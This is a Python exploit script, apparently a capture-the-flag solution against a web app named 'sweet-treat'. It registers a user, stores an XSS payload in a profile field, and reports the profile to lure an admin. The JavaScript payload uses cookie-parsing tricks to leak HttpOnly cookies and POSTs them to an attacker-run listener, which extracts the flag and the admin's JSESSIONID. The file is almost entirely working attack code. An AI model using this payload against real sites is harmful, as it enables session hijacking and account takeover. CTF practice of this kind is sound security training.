# Generally required imports
import requests
import argparse
import threading
import re
import string
import random
# If a server needs to be spun up to deliver payloads etc
from http.server import BaseHTTPRequestHandler, HTTPServer

JS_PAYLOAD = """
<script>
document.cookie = `$Version=1; path=/index.jsp;`;
document.cookie = `language="start; path=/index.jsp;`;
document.cookie = `end="; path=/`;
fetch("/index.jsp").then(function (res){return res.text();}).then(
function (html) {
    console.log("Sending exfil");
    fetch("http://<attacker_lhost>:<attacker_lport>/exfil",
    {
        method: "POST",
        body: html.substring(0,135)
    });
});
</script>"""

xss_event = threading.Event()

def start_web_server():
    class MyHandler(BaseHTTPRequestHandler):
        def do_POST(self):
            if self.path.endswith('/exfil'):
                self.send_response(200)
                self.send_header('Access-Control-Allow-Origin', '*')
                self.send_header("Content-Length", str(len("thanks")))
                self.end_headers()
                self.wfile.write("thanks".encode())
                content_length = int(self.headers['Content-Length'])
                post_data_bytes = self.rfile.read(content_length)
                response_data = post_data_bytes.decode()
                flag = re.search("flag=(.*);", response_data).group(1)
                JSESSIONID = re.search("JSESSIONID=(.*); flag", response_data).group(1)
                print("[+] XSS payload executed, received data:")
                print("[+] Flag: ", flag)
                print("[+] JSESSIONID: ", JSESSIONID)
                print("[+] Data: ", response_data.lstrip("\n").rstrip("\n"))
                print("[+] Admin interaction detected, shutting down server...")
                xss_event.set()

    print(
        "[+] Running HTTP Server on port %s to catch admin interaction", LPORT)
    httpd = HTTPServer((LHOST, int(LPORT)), MyHandler)
    threading.Thread(target=httpd.serve_forever).start()
    return httpd

def register_user():
    data = {
        "username": USERNAME,
        "password": PASSWORD
    }
    response = requests.post(f"{URL}/register.jsp", data=data)
    assert response.status_code == 200, "Failed to register user"

def login(session):
    data = {
        "username": USERNAME,
        "password": PASSWORD
    }
    response = session.post(f"{URL}/login.jsp", data=data)
    assert response.status_code == 200, "Failed to log in"
    return session

def send_xss_payload(session):
    xss_payload = JS_PAYLOAD.replace("<attacker_lhost>", LHOST).replace("<attacker_lport>", LPORT)
    data = {
        "aboutMe": xss_payload
    }
    response = session.post(f"{URL}/edit_profile.jsp", data=data)
    assert response.status_code == 200, "Failed to inject XSS payload"

def report_profile(session):
    data = {
        "reportProfile": "submit"
    }
    response = session.post(f"{URL}/edit_profile.jsp", data=data)
    assert response.status_code == 200, "Failed to report profile"

URL, LHOST, USERNAME, LPORT, PASSWORD= [ "", "", "", "", ""]

if __name__ == "__main__":
    user = ''.join(random.choice(string.ascii_lowercase) for i in range(4))
    parser = argparse.ArgumentParser()
    parser.add_argument(
        '--url', help='Target url with port, for e.g. http://127.0.0.1:8888/', default="http://sweet-treat:8888/")
    parser.add_argument('--username', '-U', help='Target username', default=user)
    parser.add_argument("--lhost", default="172.17.0.1",
                        help="Your local host for the HTTP Server")
    parser.add_argument("--lport", default="8000",
                        help="HTTP Server port to listen on")
    parser.add_argument("--password", default="password",
                        help="Set the password")
    args = parser.parse_args()
    # Setting all the globals, just so that they look cleaner
    USERNAME, LHOST, LPORT, PASSWORD = [
        args.username, args.lhost, args.lport, args.password]
    URL = args.url if args.url[-1] != "/" else args.url[:-1]
    # Set up logging to save time with errors
    httpd = start_web_server()
    session = requests.Session()
    register_user()
    session = login(session)
    print("[+] User registered and logged in successfully")
    print("[+] Injecting XSS payload into the admin page")
    send_xss_payload(session)
    report_profile(session)
    print("[+] XSS payload sent, waiting for admin interaction...")
    xss_event.wait()
    httpd.shutdown()
